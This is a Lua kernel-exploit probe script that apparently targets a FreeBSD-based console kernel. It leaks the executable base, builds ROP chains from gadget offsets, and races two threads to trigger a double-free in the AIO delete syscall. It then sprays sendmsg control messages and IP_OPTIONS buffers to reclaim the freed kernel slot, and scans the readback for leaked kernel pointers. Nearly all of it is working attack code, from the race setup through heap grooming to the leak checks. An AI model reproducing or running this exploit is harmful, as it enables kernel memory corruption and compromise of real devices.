-- CRASH_CLASS: MODERATE
-- PROBE 68b: AIO double-free → socketpair/sendmsg spray for zone overlap
--
-- The freed AIO tracking structure is ~48 bytes (zone-48 or zone-64).
-- 67d/67e showed AIO-on-AIO reclaim doesn't change 663 status.
--
-- This probe uses a different approach: after the double-free puts the
-- tracking structure on the free list twice, we spray with sendmsg()
-- ancillary data (cmsg) of controlled sizes to land in the same zone.
--
-- FreeBSD malloc(N) for N<=48 goes to zone-48 or zone-64. sendmsg with
-- msg_control allocates a kernel copy of the cmsg data. If the cmsg
-- lands in the freed slot, the AIO tracking structure now contains our
-- controlled bytes. Querying via 663 reads the status field from our
-- controlled data.
--
-- Also tries: write() to socketpair with small messages (kernel mbuf
-- inline data), IP_OPTIONS setsockopt (variable-length kernel alloc),
-- and massive AIO churning to force UMA cache draining.

print("=== PROBE 68b: socketpair/sendmsg spray ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end
local function fmt_q(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    return string.format("0x%08X_%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt_q(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

-- AIO helpers
local reqs_b = memory.alloc(0x30)
local dbuf = memory.alloc(0x4000)
local rbuf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs_b), uint64(0))
    wq(N(reqs_b) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(dbuf)))
    wd(N(reqs_b) + 0x10, bl); wd(N(reqs_b) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(rbuf)))
    wd(N(reqs_b) + 0x18, rl); wd(N(reqs_b) + 0x1C, rh)
    wd(N(reqs_b) + 0x20, fd_zero); wd(N(reqs_b) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs_b)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end
local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end
local function query_663(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEADDEAD)
    pcall(function() mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xDEADDEAD
end
local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xCD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0xCD
end

-- =========================================================
-- [A] DOUBLE-FREE + OVERLAP SETUP
-- =========================================================
print("")
print("[A] Double-free + AIO spray + overlap verify")

-- Race: 30 iters to get plenty of double-frees
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local sts_A = memory.alloc(4 * BATCH + 0x10)
local sts_B = memory.alloc(4 * BATCH + 0x10)
local mk_A = memory.alloc(8)
local mk_B = memory.alloc(8)
local total_doubles = 0

for iter = 1, 30 do
    if not alive() then break end
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids == 0 then break end
    local cnt = #ids
    for i = 0, cnt - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(sts_A) + i * 4, 0xAA); wd(N(sts_B) + i * 4, 0xBB)
    end
    wq(N(mk_A), uint64(0)); wq(N(mk_B), uint64(0))

    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41))
    emA(g_pop_rdi); emA(uint64(N(mk_A)))
    emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(cnt))
    emA(g_pop_rdx); emA(uint64(N(sts_A)))
    emA(g_pop_rax); emA(uint64(662))
    emA(stub)
    emA(g_pop_rdi); emA(uint64(0))
    emA(g_pop_rax); emA(uint64(431)); emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42))
    emB(g_pop_rdi); emB(uint64(N(mk_B)))
    emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(cnt))
    emB(g_pop_rdx); emB(uint64(N(sts_B)))
    emB(g_pop_rax); emB(uint64(662))
    emB(stub)
    emB(g_pop_rdi); emB(uint64(0))
    emB(g_pop_rax); emB(uint64(431)); emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A))
    wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0))
    wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B))
    wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0))
    wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(sb_A) end

    local dbl = 0
    for i = 0, cnt - 1 do
        if (rd(N(sts_A) + i * 4) or 1) == 0 and (rd(N(sts_B) + i * 4) or 1) == 0 then
            dbl = dbl + 1
        end
    end
    total_doubles = total_doubles + dbl
end
print("  total_doubles=" .. total_doubles)
if total_doubles < 4 or not alive() then
    print("  INSUFFICIENT or DEAD")
    print("=== 68b DONE ===")
    return
end

-- Spray AIO + overlap verify
local SPRAY = 128
local spray_ids = {}
for i = 1, SPRAY do
    local id = submit_one()
    if id ~= 0 then spray_ids[#spray_ids + 1] = id end
end
for i = 1, #spray_ids, 2 do poll_one(spray_ids[i]) end
local overlap = 0
for i = 2, #spray_ids, 2 do
    if query_663(spray_ids[i]) == 0x00010003 then overlap = overlap + 1 end
end
print("  overlap=" .. overlap .. "/" .. math.floor(#spray_ids / 2))
if overlap < 4 then
    print("  INSUFFICIENT overlap")
    print("=== 68b DONE ===")
    return
end

-- Record baseline
local base = {}
for i = 2, #spray_ids, 2 do base[i] = query_663(spray_ids[i]) end

-- =========================================================
-- [B] DELETE FIRST PARTNERS
-- =========================================================
print("")
print("[B] Delete first partners")
for i = 1, #spray_ids, 2 do
    poll_one(spray_ids[i])
    delete_one(spray_ids[i])
end
if not alive() then print("DEAD"); return end

-- =========================================================
-- [C] HEAVY SPRAY: UMA cache drain + cross-type
-- =========================================================
print("")
print("[C] Heavy cross-type spray")

-- Phase 1: Drain UMA caches by submitting + deleting many AIO requests
-- This forces the per-CPU cache buckets to flush to the global free list
print("  Phase 1: AIO cache drain (submit+delete 512)")
for drain = 1, 4 do
    local drain_ids = {}
    for i = 1, 128 do
        local id = submit_one()
        if id ~= 0 then drain_ids[#drain_ids + 1] = id end
    end
    for _, id in ipairs(drain_ids) do poll_one(id) end
    for _, id in ipairs(drain_ids) do delete_one(id) end
end
print("    done")
if not alive() then print("DEAD during drain"); return end

-- Phase 2: sendmsg with cmsg control data of target sizes (32, 48, 64)
-- FreeBSD sendmsg: kernel does sockargs() → m_get+copyin for control
-- For AF_UNIX SOCK_DGRAM, small messages go inline in mbufs (256B)
-- But msg_control is processed by unp_internalize → malloc for SCM_RIGHTS
-- Since SCM_RIGHTS is stripped, use SCM_TIMESTAMP type for cmsg

print("  Phase 2: sendmsg cmsg spray")
local sp_buf = memory.alloc(8)
local msg_pairs = {}
for i = 1, 32 do
    if not alive() then break end
    wd(N(sp_buf), 0); wd(N(sp_buf) + 4, 0)
    local ok, ret = pcall(function()
        return mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp_buf)))
    end)
    if ok and sgn(ret) == 0 then
        msg_pairs[#msg_pairs + 1] = {rd(N(sp_buf)) or -1, rd(N(sp_buf) + 4) or -1}
    end
end
print("    socketpairs=" .. #msg_pairs)

-- Build msghdr + cmsg with controlled patterns at target sizes
-- struct msghdr: name(8) namelen(4) pad(4) iov(8) iovlen(4) pad(4) control(8) controllen(4)
-- struct cmsghdr: cmsg_len(4) cmsg_level(4) cmsg_type(4) [data...]

local cmsg_sent = 0
for _, sizes in ipairs({32, 48, 64}) do
    for p = 1, math.min(#msg_pairs, 10) do
        if not alive() then break end
        local wfd = msg_pairs[p][2]
        if wfd < 0 then break end

        -- Build iovec for 4-byte payload
        local payload = memory.alloc(8)
        wd(N(payload), 0x58585858)
        local iov = memory.alloc(16)
        wq(N(iov), uint64(N(payload)))
        wq(N(iov) + 8, uint64(4))

        -- Build cmsg: header(12) + data(sizes-12)
        local cmsg = memory.alloc(sizes + 16)
        wd(N(cmsg), sizes)           -- cmsg_len
        wd(N(cmsg) + 4, 0xFFFF)     -- cmsg_level = SOL_SOCKET
        wd(N(cmsg) + 8, 0x1234)     -- cmsg_type = arbitrary
        -- Fill cmsg data with marker pattern
        for off = 12, sizes - 1, 4 do
            wd(N(cmsg) + off, 0xDEADBEEF)
        end

        -- Build msghdr
        local msghdr = memory.alloc(0x40)
        for off = 0, 0x3C, 4 do wd(N(msghdr) + off, 0) end
        wq(N(msghdr) + 0x10, uint64(N(iov)))     -- msg_iov
        wd(N(msghdr) + 0x18, 1)                   -- msg_iovlen
        wq(N(msghdr) + 0x20, uint64(N(cmsg)))    -- msg_control
        wd(N(msghdr) + 0x28, sizes)               -- msg_controllen

        local ok, ret = pcall(function()
            return mk(28)(uint64(wfd), uint64(N(msghdr)), uint64(0))
        end)
        if ok and sgn(ret) > 0 then cmsg_sent = cmsg_sent + 1 end
    end
end
print("    cmsg_sent=" .. cmsg_sent)

-- Phase 3: setsockopt spray with IP_OPTIONS (variable-length, 4-44 bytes)
print("  Phase 3: setsockopt(IP_OPTIONS) spray")
local so_fds = {}
for i = 1, 48 do
    if not alive() then break end
    local ok, ret = pcall(function()
        return mk(97)(uint64(2), uint64(2), uint64(17))  -- AF_INET, SOCK_DGRAM, UDP
    end)
    if ok and sgn(ret) >= 0 then so_fds[#so_fds + 1] = sgn(ret) end
end
print("    udp_sockets=" .. #so_fds)

local ip_opt_set = 0
for _, fd in ipairs(so_fds) do
    if not alive() then break end
    -- IP_OPTIONS = 1, IPPROTO_IP = 0
    -- Max 44 bytes (MAX_IPOPTLEN)
    for _, sz in ipairs({32, 40, 44, 48}) do
        local opt = memory.alloc(sz + 8)
        for off = 0, sz - 1, 4 do wd(N(opt) + off, 0xCAFEBABE) end
        local ok, ret = pcall(function()
            mk(105)(uint64(fd), uint64(0), uint64(1), uint64(N(opt)), uint64(sz))
        end)
        if ok and sgn(ret) == 0 then ip_opt_set = ip_opt_set + 1 end
    end
end
print("    ip_options_set=" .. ip_opt_set)

if not alive() then print("DEAD during spray"); return end

-- =========================================================
-- [D] CHECK 663 STATUS FOR CORRUPTION
-- =========================================================
print("")
print("[D] Query survivors after spray")

local changed = 0
local anomalies = {}
for i = 2, #spray_ids, 2 do
    if not alive() then break end
    local st = query_663(spray_ids[i])
    if st ~= base[i] then
        changed = changed + 1
        anomalies[#anomalies + 1] = string.format("id=%d: %08X->%08X",
            spray_ids[i], base[i], st)
    end
end
print("  changed=" .. changed .. "/" .. math.floor(#spray_ids / 2))
if #anomalies > 0 then
    print("  ANOMALIES:")
    for j = 1, math.min(20, #anomalies) do print("    " .. anomalies[j]) end
end

-- =========================================================
-- [E] RECVMSG READBACK: check for kernel data in received messages
-- =========================================================
print("")
print("[E] Recvmsg readback")

local kptr_in_recv = 0
for p = 1, math.min(#msg_pairs, 8) do
    if not alive() then break end
    local rfd = msg_pairs[p][1]
    if rfd < 0 then break end

    local recv_data = memory.alloc(0x100)
    local recv_ctrl = memory.alloc(0x200)
    local recv_iov = memory.alloc(16)
    for off = 0, 0xFC, 4 do wd(N(recv_data) + off, 0xAAAAAAAA) end
    for off = 0, 0x1FC, 4 do wd(N(recv_ctrl) + off, 0xBBBBBBBB) end
    wq(N(recv_iov), uint64(N(recv_data)))
    wq(N(recv_iov) + 8, uint64(0x100))

    local recv_hdr = memory.alloc(0x40)
    for off = 0, 0x3C, 4 do wd(N(recv_hdr) + off, 0) end
    wq(N(recv_hdr) + 0x10, uint64(N(recv_iov)))
    wd(N(recv_hdr) + 0x18, 1)
    wq(N(recv_hdr) + 0x20, uint64(N(recv_ctrl)))
    wd(N(recv_hdr) + 0x28, 0x200)

    local ok, ret = pcall(function()
        return mk(27)(uint64(rfd), uint64(N(recv_hdr)), uint64(0x40))
    end)
    local r = ok and sgn(ret) or -999

    if r > 0 then
        local controllen = rd(N(recv_hdr) + 0x28) or 0
        -- Scan control data for kernel pointers
        for off = 0, math.min(controllen, 0x1F8), 8 do
            local q = rq(N(recv_ctrl) + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptr_in_recv = kptr_in_recv + 1
                    print(string.format("  *** KPTR pair[%d] ctrl+%02X: %s ***",
                        p, off, fmt_q(q)))
                end
            end
        end
        -- Scan message data too
        for off = 0, math.min(r, 0xF8), 8 do
            local q = rq(N(recv_data) + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptr_in_recv = kptr_in_recv + 1
                    print(string.format("  *** KPTR pair[%d] data+%02X: %s ***",
                        p, off, fmt_q(q)))
                end
            end
        end

        if p <= 3 then
            -- Dump first 32 bytes of control for forensics
            local hex = ""
            for off = 0, 28, 4 do
                hex = hex .. string.format("%08X ", rd(N(recv_ctrl) + off) or 0)
            end
            print(string.format("  pair[%d] ret=%d clen=%d ctrl: %s", p, r, controllen, hex))
        end
    end
end
print("  kptrs_in_recv=" .. kptr_in_recv)

-- =========================================================
-- [F] GETSOCKOPT READBACK: check IP_OPTIONS for corruption
-- =========================================================
print("")
print("[F] getsockopt(IP_OPTIONS) readback")

local kptr_in_getopt = 0
for idx = 1, math.min(#so_fds, 16) do
    if not alive() then break end
    local fd = so_fds[idx]
    local outbuf = memory.alloc(0x80)
    local outsz = memory.alloc(8)
    for off = 0, 0x7C, 4 do wd(N(outbuf) + off, 0xCCCCCCCC) end
    wd(N(outsz), 0x80)

    local ok, ret = pcall(function()
        return mk(118)(uint64(fd), uint64(0), uint64(1), uint64(N(outbuf)), uint64(N(outsz)))
    end)
    local r = ok and sgn(ret) or -999
    local actual_sz = rd(N(outsz)) or 0

    if r == 0 and actual_sz > 0 then
        -- Scan for kernel pointers
        for off = 0, math.min(actual_sz, 0x78), 8 do
            local q = rq(N(outbuf) + off)
            if q then
                local h, l = get_hi_lo(q)
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    kptr_in_getopt = kptr_in_getopt + 1
                    print(string.format("  *** KPTR fd=%d +%02X: %s ***", fd, off, fmt_q(q)))
                end
            end
        end
        -- Check for non-CAFEBABE values (corruption from overlap)
        local corrupted = 0
        for off = 0, actual_sz - 1, 4 do
            local v = rd(N(outbuf) + off) or 0xCCCCCCCC
            if v ~= 0xCAFEBABE and v ~= 0xCCCCCCCC and v ~= 0 then
                corrupted = corrupted + 1
            end
        end
        if corrupted > 0 and idx <= 4 then
            local hex = ""
            for off = 0, math.min(actual_sz - 1, 28), 4 do
                hex = hex .. string.format("%08X ", rd(N(outbuf) + off) or 0)
            end
            print(string.format("  fd=%d sz=%d corrupted=%d: %s", fd, actual_sz, corrupted, hex))
        end
    end
end
print("  kptrs_in_getopt=" .. kptr_in_getopt)

-- =========================================================
-- [G] CLEANUP
-- =========================================================
if alive() then
    print("")
    print("[G] Cleanup")
    for _, pair in ipairs(msg_pairs) do
        pcall(function() mk(6)(uint64(pair[1])) end)
        pcall(function() mk(6)(uint64(pair[2])) end)
    end
    for _, fd in ipairs(so_fds) do
        pcall(function() mk(6)(uint64(fd)) end)
    end
    for i = 2, #spray_ids, 2 do
        poll_one(spray_ids[i])
        delete_one(spray_ids[i])
    end
    print("  done")
end

print("")
print("alive=" .. (alive() and "YES" or "NO"))
print("=== 68b COMPLETE ===")
